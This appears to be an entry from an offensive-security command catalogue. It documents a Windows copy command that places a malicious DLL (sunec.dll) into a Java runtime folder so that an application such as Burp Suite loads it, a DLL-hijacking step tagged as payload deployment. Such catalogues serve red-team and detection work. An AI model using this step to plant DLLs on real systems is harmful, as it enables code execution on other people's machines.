---
id: cmd-copy-dll
data: >-
  copy sunec.dll "C:\\Program
  Files\\Java\\jre1.8.0_xxx\\bin\\server\\amd64\\sunec.dll"
tags:
  - file-copy
  - payload-deployment
type: command
output: null
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.104Z'
verified: false
validated: true
submitted: true
---
# copy-malicious-dll

## Command

```cmd
copy sunec.dll "C:\Program Files\Java\jre1.8.0_xxx\bin\server\amd64\sunec.dll"
```

## Description

Copies a malicious DLL file to a target hijackable path on Windows, enabling execution when the path is loaded by an application like Burp Suite.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Source | Path to source DLL | Yes |
| Destination | Quoted target path | Yes |

## Examples

### Basic Usage

```cmd
copy malicious.dll C:\temp\target.dll
```

### Advanced Usage

```cmd
copy sunec.dll "C:\Program Files\Java\jre1.8.0_xxx\bin\server\amd64\sunec.dll"
```

## Expected Output

"1 file(s) copied" indicating successful transfer.

## Related

- [[Related Procedure: Place-Malicious-DLL]]
